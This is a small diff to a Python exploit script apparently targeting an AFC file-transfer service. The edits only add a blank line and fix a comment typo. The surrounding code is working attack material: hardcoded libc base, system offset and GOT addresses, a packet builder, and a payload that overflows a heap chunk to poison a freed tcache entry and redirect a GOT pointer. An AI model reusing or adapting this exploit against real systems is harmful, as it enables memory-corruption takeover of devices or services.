@@ -26,6 +26,7 @@ AFC_OP_DATA = 2
 SYSTEM_OFFSET = 0x52290
 AFC_FILE_WRITE_GOT = 0x4040a0
 libc_base = 0x7ffff7d63000
+
 def pkt(entire_len, this_len, packet_num, payload):
     packet = AFC_MAGIC
     packet += p64(40 + entire_len)
@@ -87,7 +88,7 @@ def main():
          len(p1)
          )
 
-    # if does malloc(entire_len=0x100) which will return the 0x110 chunk on
+    # it does malloc(entire_len=0x100) which will return the 0x110 chunk on
     # tcache, and then afc_receive_data reads this_len=0x110 into it, leading
     # to an overflow into the 0x20 freed chunk and overwriting its fd ptr
     p2 = b"D"*0x110 + p64(AFC_FILE_WRITE_GOT)
